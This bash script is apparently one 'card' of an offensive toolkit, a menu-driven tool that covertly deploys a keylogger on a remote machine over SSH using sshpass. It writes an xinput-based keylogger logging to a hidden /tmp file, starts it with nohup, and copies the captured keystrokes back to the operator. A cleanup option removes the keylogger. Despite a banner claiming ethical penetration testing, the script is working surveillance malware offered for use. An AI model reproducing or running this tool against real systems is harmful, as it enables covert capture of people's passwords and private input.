#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'

# Menu for the Ten of Spades Card
ten_of_spades_menu() {
    clear
    echo -e "${CYAN}"
    echo "      __________________________________________________________________________"
    echo "     |                              Ten of Spades                               |"
    echo "     |                        Log Keystrokes Covertly                           |"
    echo "     |__________________________________________________________________________|"
    echo "     |                                                                          |"
    echo "     |  This card enables you to deploy and manage a keylogger on a target      |"
    echo "     |  system for ethical penetration testing and monitoring purposes.         |"
    echo "     |                                                                          |"
    echo "     |                                                                          |"
    echo "     |  1. Deploy Keylogger                                                     |"
    echo "     |  2. Retrieve Keystroke Logs                                              |"
    echo "     |  3. Remove Keylogger                                                     |"
    echo "     |  4. Exit                                                                 |"
    echo "     |__________________________________________________________________________|"
    echo -e "${RESET}"
    read -p "Enter your choice: " choice
    case $choice in
        1) deploy_keylogger ;;
        2) retrieve_logs ;;
        3) remove_keylogger ;;
        4) exit 0 ;;
        *) echo "Invalid choice. Try again."; sleep 1; ten_of_spades_menu ;;
    esac
}

# Deploy the keylogger on the target system
deploy_keylogger() {
    clear
    echo -e "${CYAN}Deploying keylogger...${RESET}"
    read -p "Enter the target IP address: " target_ip
    read -p "Enter the target username: " username
    read -s -p "Enter the target password: " password
    echo ""

    keylogger_script="keylogger.sh"
    cat << 'EOF' > "$keylogger_script"
#!/bin/bash
log_file="/tmp/.keystrokes.log"
xinput --test "$(xinput --list | grep -i keyboard | head -n1 | awk -F'id=' '{print $2}' | awk '{print $1}')" > "$log_file" &
EOF

    chmod +x "$keylogger_script"
    sshpass -p "$password" scp "$keylogger_script" "$username@$target_ip:/tmp/"
    sshpass -p "$password" ssh "$username@$target_ip" "nohup bash /tmp/keylogger.sh &"
    echo -e "${CYAN}Keylogger deployed and running on $target_ip.${RESET}"
    rm "$keylogger_script"
    read -n 1 -s -r -p "Press any key to return to the menu..."
    ten_of_spades_menu
}

# Retrieve keystroke logs from the target system
retrieve_logs() {
    clear
    echo -e "${CYAN}Retrieving keystroke logs...${RESET}"
    read -p "Enter the target IP address: " target_ip
    read -p "Enter the target username: " username
    read -s -p "Enter the target password: " password
    echo ""

    sshpass -p "$password" scp "$username@$target_ip:/tmp/.keystrokes.log" "./keystrokes.log"
    if [[ -f "./keystrokes.log" ]]; then
        echo -e "${CYAN}Keystroke logs saved to ./keystrokes.log.${RESET}"
        less "./keystrokes.log"
    else
        echo -e "${CYAN}Failed to retrieve keystroke logs.${RESET}"
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    ten_of_spades_menu
}

# Remove the keylogger from the target system
remove_keylogger() {
    clear
    echo -e "${CYAN}Removing keylogger...${RESET}"
    read -p "Enter the target IP address: " target_ip
    read -p "Enter the target username: " username
    read -s -p "Enter the target password: " password
    echo ""

    sshpass -p "$password" ssh "$username@$target_ip" "pkill -f 'xinput --test'; rm /tmp/keylogger.sh /tmp/.keystrokes.log"
    echo -e "${CYAN}Keylogger removed from $target_ip.${RESET}"
    read -n 1 -s -r -p "Press any key to return to the menu..."
    ten_of_spades_menu
}

ten_of_spades_menu
